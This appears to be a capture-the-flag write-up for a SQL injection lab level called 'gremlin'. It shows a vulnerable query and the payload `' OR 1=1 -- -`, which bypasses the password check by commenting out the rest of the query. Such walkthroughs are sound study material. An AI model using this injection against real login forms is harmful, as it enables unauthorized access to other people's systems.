---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 1
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/18cc31d8-0f98-466a-84f6-3d68bf23ab5f)

We are provided with the SQL query:

```sql
SELECT id FROM prob_gremlin WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

In order to make the result of this query `True`, we can provide the following URI:

```
?id=' OR 1=1 -- -
```

The resultant query then becomes:

```sql
SELECT id FROM prob_gremlin WHERE id='' OR 1=1 -- -' AND pw=''

## Queried part:
SELECT id FROM prob_gremlin WHERE id='' OR 1=1

## Commented part:
AND pw=''
```

Since 1=1 is always true, the result of the `OR` operation will always be `True`.

![2](https://github.com/Kunull/Write-ups/assets/110326359/002d0b4e-53d5-41f0-a173-50f3058c5302)
